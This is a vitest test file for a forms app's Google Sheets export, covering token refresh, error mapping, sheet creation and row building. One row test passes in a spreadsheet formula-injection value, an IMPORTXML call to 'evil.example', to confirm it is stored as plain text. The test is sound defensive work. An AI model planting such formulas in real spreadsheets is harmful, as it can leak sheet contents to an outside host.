import { readFileSync } from "node:fs";
import { parseForm, type Form } from "@freelyforms/form-schema";
import { describe, expect, it } from "vitest";
import {
  addMissingColumns,
  answerCell,
  appendRows,
  buildRow,
  createResponseSpreadsheet,
  errorFromResponse,
  GoogleApiError,
  headerLabels,
  refreshAccessToken,
  resolveColumns,
  sheetsClient,
  SYSTEM_COLUMNS,
} from "./index.js";

const form = (() => {
  const url = new URL("../../form-schema/fixtures/all-fields.json", import.meta.url);
  const result = parseForm(JSON.parse(readFileSync(url, "utf8")));
  if (!result.success) throw new Error("fixture");
  return result.form;
})();

interface Call {
  url: string;
  method: string;
  auth: string | null;
  body: unknown;
}

/** Fake fetch that records calls and replies from a queue. */
function fake(...replies: (Response | Error)[]) {
  const calls: Call[] = [];
  const fetchFn: typeof fetch = (input, init) => {
    const headers = new Headers(init?.headers);
    const raw = init?.body;
    calls.push({
      url: typeof input === "string" ? input : input instanceof URL ? input.href : input.url,
      method: init?.method ?? "GET",
      auth: headers.get("authorization"),
      body:
        typeof raw === "string" && raw.startsWith("{")
          ? JSON.parse(raw)
          : raw instanceof URLSearchParams
            ? Object.fromEntries(raw)
            : raw,
    });
    const reply = replies.shift() ?? Response.json({});
    return reply instanceof Error ? Promise.reject(reply) : Promise.resolve(reply);
  };
  return { fetchFn, calls };
}

const googleError = (status: number, reason?: string, message?: string) =>
  Response.json(
    { error: { code: status, message, errors: reason ? [{ reason }] : [] } },
    { status },
  );

describe("refreshAccessToken", () => {
  const args = { clientId: "id", clientSecret: "secret", refreshToken: "1//r", now: 1_000_000 };

  it("returns the access token with an early expiry", async () => {
    const { fetchFn, calls } = fake(
      Response.json({
        access_token: "ya29.x",
        expires_in: 3599,
        scope: "openid https://www.googleapis.com/auth/drive.file",
      }),
    );
    const token = await refreshAccessToken(fetchFn, args);
    expect(token).toEqual({
      token: "ya29.x",
      expiresAt: 1_000_000 + 3539 * 1000,
      scopes: ["openid", "https://www.googleapis.com/auth/drive.file"],
    });
    expect(calls[0]?.body).toMatchObject({ grant_type: "refresh_token", refresh_token: "1//r" });
  });

  it.each([
    [Response.json({ error: "invalid_grant" }, { status: 400 }), "ACCESS_REVOKED"],
    [new Response("oops", { status: 503 }), "TRANSIENT"],
    [new TypeError("network down"), "TRANSIENT"],
  ])("classifies failures (%#)", async (reply, kind) => {
    const { fetchFn } = fake(reply);
    await expect(refreshAccessToken(fetchFn, args)).rejects.toMatchObject({ kind });
  });
});

describe("errorFromResponse", () => {
  it.each([
    [googleError(429), "QUOTA", true],
    [googleError(403, "rateLimitExceeded"), "QUOTA", true],
    [googleError(500), "TRANSIENT", true],
    [googleError(401), "ACCESS_REVOKED", false],
    [googleError(403, "forbidden"), "ACCESS_REVOKED", false],
    [googleError(404), "SHEET_DELETED", false],
    [
      googleError(400, undefined, "Invalid requests[0].appendCells: No grid with id: 7"),
      "TAB_MISSING",
      false,
    ],
    [googleError(400, "badRequest", "Invalid value"), "INVALID_REQUEST", false],
  ])("maps %# to %s", async (res, kind, retryable) => {
    const err = await errorFromResponse(res);
    expect(err).toBeInstanceOf(GoogleApiError);
    expect(err.kind).toBe(kind);
    expect(err.retryable).toBe(retryable);
  });
});

describe("createResponseSpreadsheet", () => {
  it("creates a frozen, bold header with system columns first and tags every column", async () => {
    const { fetchFn, calls } = fake(
      Response.json({
        spreadsheetId: "S1",
        spreadsheetUrl: "https://docs.google.com/x",
        sheets: [{ properties: { sheetId: 42 } }],
      }),
      Response.json({}),
    );
    const dest = await createResponseSpreadsheet(sheetsClient(fetchFn, "ya29.t"), {
      title: "Responses: Event",
      form,
    });
    expect(dest).toEqual({ spreadsheetId: "S1", sheetId: 42, url: "https://docs.google.com/x" });
    expect(calls.every((c) => c.auth === "Bearer ya29.t")).toBe(true);

    const create = calls[0]?.body as {
      sheets: {
        properties: unknown;
        data: { rowData: { values: { userEnteredValue: { stringValue: string } }[] }[] }[];
      }[];
    };
    const header = create.sheets[0]?.data[0]?.rowData[0]?.values.map(
      (v) => v.userEnteredValue.stringValue,
    );
    expect(header?.slice(0, 3)).toEqual([...SYSTEM_COLUMNS]);
    expect(header?.slice(3)).toEqual(form.fields.map((f) => f.label));
    expect(create.sheets[0]?.properties).toMatchObject({
      title: "Responses",
      gridProperties: { frozenRowCount: 1 },
    });

    expect(calls[1]?.url).toBe("https://sheets.googleapis.com/v4/spreadsheets/S1:batchUpdate");
    const requests = (
      calls[1]?.body as {
        requests: { createDeveloperMetadata: { developerMetadata: Record<string, unknown> } }[];
      }
    ).requests;
    expect(requests).toHaveLength(3 + form.fields.length);
    expect(requests[3]?.createDeveloperMetadata.developerMetadata).toEqual({
      metadataKey: "app_field_id",
      metadataValue: form.fields[0]?.id,
      visibility: "PROJECT",
      location: {
        dimensionRange: { sheetId: 42, dimension: "COLUMNS", startIndex: 3, endIndex: 4 },
      },
    });
  });

  it("disambiguates duplicate labels", () => {
    expect(
      headerLabels({
        fields: [
          { id: "fld_a", type: "text", label: "Name" },
          { id: "fld_b", type: "text", label: "Name" },
        ],
      }),
    ).toEqual(["Name", "Name (2)"]);
  });
});

describe("columns", () => {
  const dest = { spreadsheetId: "S1", sheetId: 42 };
  const meta = (value: string, sheetId: number, startIndex: number) => ({
    developerMetadata: {
      metadataValue: value,
      location: { dimensionRange: { sheetId, startIndex } },
    },
  });

  it("resolves columns of the destination tab only, wherever the owner moved them", async () => {
    const { fetchFn } = fake(
      Response.json({
        matchedDeveloperMetadata: [
          meta("_submission_id", 42, 0),
          meta("fld_name", 42, 7),
          meta("fld_name", 99, 1),
        ],
      }),
    );
    const columns = await resolveColumns(sheetsClient(fetchFn, "t"), dest);
    expect([...columns]).toEqual([
      ["_submission_id", 0],
      ["fld_name", 7],
    ]);
  });

  it("appends columns for new fields after the last known column", async () => {
    const { fetchFn, calls } = fake(Response.json({}));
    const small: Pick<Form, "fields"> = {
      fields: [
        { id: "fld_old", type: "text", label: "Old" },
        { id: "fld_new", type: "email", label: "New" },
      ],
    };
    const columns = new Map([
      ["_submission_id", 0],
      ["fld_old", 5],
      ["fld_removed", 6],
    ]);
    const updated = await addMissingColumns(sheetsClient(fetchFn, "t"), dest, small, columns);
    expect(updated.get("fld_new")).toBe(7);
    expect(updated.get("fld_removed")).toBe(6);
    const requests = (calls[0]?.body as { requests: Record<string, unknown>[] }).requests;
    expect(requests[0]).toEqual({
      appendDimension: { sheetId: 42, dimension: "COLUMNS", length: 1 },
    });
    expect(JSON.stringify(requests[1])).toContain('"columnIndex":7');
  });

  it("does not call Google when nothing is missing", async () => {
    const { fetchFn, calls } = fake();
    const columns = new Map([["fld_a", 3]]);
    await addMissingColumns(
      sheetsClient(fetchFn, "t"),
      dest,
      { fields: [{ id: "fld_a", type: "text", label: "A" }] },
      columns,
    );
    expect(calls).toHaveLength(0);
  });
});

describe("rows", () => {
  it("writes typed cells, option labels and system columns at their resolved positions", () => {
    const columns = new Map<string, number>([
      ["_submission_id", 0],
      ["_submitted_at", 1],
      ["_form_version", 2],
      ["fld_name", 5],
      ["fld_guests", 3],
      ["fld_sessions", 4],
      ["fld_ticket", 6],
      ["fld_consent", 8],
    ]);
    const row = buildRow(form, columns, {
      submissionId: "01JABC",
      submittedAt: Date.UTC(2026, 9, 16, 1, 2, 3),
      formVersion: 3,
      values: {
        fld_name: '=IMPORTXML("https://evil.example","//a")',
        fld_guests: 2,
        fld_sessions: ["opt_morning", "opt_evening"],
        fld_ticket: "opt_vip",
        fld_consent: true,
      },
    });
    expect(row).toEqual([
      { userEnteredValue: { stringValue: "01JABC" } },
      { userEnteredValue: { stringValue: "2026-10-16T01:02:03.000Z" } },
      { userEnteredValue: { numberValue: 3 } },
      { userEnteredValue: { numberValue: 2 } },
      { userEnteredValue: { stringValue: "Morning, Evening" } },
      { userEnteredValue: { stringValue: '=IMPORTXML("https://evil.example","//a")' } },
      { userEnteredValue: { stringValue: "VIP" } },
      {},
      { userEnteredValue: { boolValue: true } },
    ]);
  });

  it("leaves unanswered and unmapped fields empty", () => {
    expect(answerCell({ id: "fld_a", type: "text", label: "A" }, undefined)).toEqual({});
    expect(
      buildRow(form, new Map(), { submissionId: "x", submittedAt: 0, formVersion: 1, values: {} }),
    ).toEqual([]);
  });

  it("appends all rows of a batch in one AppendCells request by tab ID", async () => {
    const { fetchFn, calls } = fake(Response.json({}));
    const client = sheetsClient(fetchFn, "t");
    await appendRows(client, { spreadsheetId: "S1", sheetId: 42 }, [
      [{ userEnteredValue: { stringValue: "a" } }],
      [{}],
    ]);
    await appendRows(client, { spreadsheetId: "S1", sheetId: 42 }, []);
    expect(calls).toHaveLength(1);
    expect(calls[0]?.body).toEqual({
      requests: [
        {
          appendCells: {
            sheetId: 42,
            rows: [{ values: [{ userEnteredValue: { stringValue: "a" } }] }, { values: [{}] }],
            fields: "userEnteredValue",
          },
        },
      ],
    });
  });

  it("turns HTTP failures into classified errors", async () => {
    const { fetchFn } = fake(googleError(404));
    await expect(
      appendRows(sheetsClient(fetchFn, "t"), { spreadsheetId: "gone", sheetId: 1 }, [[{}]]),
    ).rejects.toMatchObject({
      kind: "SHEET_DELETED",
    });
  });
});
